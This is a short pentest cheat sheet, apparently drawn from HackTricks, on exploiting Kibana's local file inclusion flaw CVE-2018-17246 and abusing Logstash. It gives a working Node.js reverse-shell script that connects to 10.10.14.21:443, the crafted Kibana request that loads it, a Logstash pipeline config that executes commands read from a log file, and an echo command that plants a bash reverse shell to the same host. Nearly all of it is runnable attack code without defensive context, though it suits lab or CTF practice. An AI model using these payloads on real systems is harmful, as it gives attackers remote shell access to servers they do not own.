____

https://book.hacktricks.xyz/network-services-pentesting/5601-pentesting-kibana

# CVE-2018-17246

Kibana LFI < 6.4.3 & 5.6.13

https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it

https://github.com/mpgn/CVE-2018-17246

```bash
cd /tmp
nano shell.js
```

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.21", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

```txt
http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/shell.js
```

# Abusing Logstash

```bash
ls -l /etc/logstash/conf.d/ 
```

```json
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
```

```json
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
```

```json
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```

```
echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.21/443 0>&1'" > /opt/kibana/logstash_dani
```

